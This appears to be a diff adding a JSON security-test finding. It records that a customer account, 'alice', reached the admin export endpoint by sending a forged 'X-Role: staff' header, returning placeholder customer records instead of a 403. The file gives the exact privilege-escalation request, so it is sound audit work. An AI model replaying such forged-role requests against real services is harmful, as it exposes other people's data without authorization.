@@ -1,0 +1,36 @@
+{
+  "id": "09-forged-role-alice",
+  "title": "Подделка X-Role клиентом alice",
+  "endpoint": "GET /admin/export (alice + X-Role: staff)",
+  "expected": "403 для роли customer",
+  "actual": "status=200, rows=2",
+  "severity": "Critical",
+  "cwe": "CWE-285",
+  "owasp_llm": "-",
+  "request": {
+    "method": "GET",
+    "path": "/admin/export",
+    "body": null,
+    "headers": {
+      "X-Token": "<token>",
+      "X-Role": "staff"
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": [
+      {
+        "id": 1,
+        "name": "TEST_ALICE",
+        "email": "alice@example.invalid",
+        "address": "TEST_ADDRESS_A"
+      },
+      {
+        "id": 2,
+        "name": "TEST_BOB",
+        "email": "bob@example.invalid",
+        "address": "TEST_ADDRESS_B"
+      }
+    ]
+  }
+}
